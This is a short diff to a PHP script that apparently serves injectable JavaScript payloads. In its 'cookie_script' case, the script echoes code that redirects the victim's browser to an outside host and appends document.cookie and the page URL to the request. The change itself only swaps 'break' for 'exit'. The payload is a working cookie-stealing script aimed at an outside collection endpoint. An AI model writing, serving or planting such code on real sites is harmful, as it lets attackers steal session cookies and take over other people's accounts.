@@ -17,7 +17,7 @@ switch ($type) {
         break;
     case 'cookie_script':
         echo 'window.location="https://cdn.lucacastelnuovo.nl/scripts/hacked?type=cookie&cookie="+document.cookie+"&link="+window.location.href';
-        break;
+        exit;
 }
 ?>
 <!DOCTYPE html>
